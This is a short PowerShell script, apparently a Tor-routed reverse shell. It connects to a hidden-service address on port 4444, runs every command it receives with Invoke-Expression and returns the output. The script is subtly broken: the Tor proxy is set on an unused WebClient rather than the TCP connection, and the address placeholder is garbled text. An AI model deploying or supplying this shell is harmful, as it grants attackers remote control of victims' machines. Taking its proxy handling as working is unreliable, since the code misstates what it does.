$torProxy = "socks5://127.0.0.1:9050"
$webClient = New-Object System.Net.WebClient
$webClient.Proxy = New-Object System.Net.WebProxy($torProxy)

$remoteAddress = "ÄãµÄ.onionµØÖ·"
$remotePort = 4444

$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($remoteAddress, $remotePort)
$networkStream = $tcpClient.GetStream()
$streamReader = New-Object System.IO.StreamReader($networkStream)
$streamWriter = New-Object System.IO.StreamWriter($networkStream)

while($tcpClient.Connected) {
    while ($networkStream.DataAvailable) {
        $command = $streamReader.ReadLine()
        $output = Invoke-Expression $command 2>&1 | Out-String
        $streamWriter.WriteLine($output)
        $streamWriter.Flush()
    }
}

$streamReader.Close()
$streamWriter.Close()
$tcpClient.Close()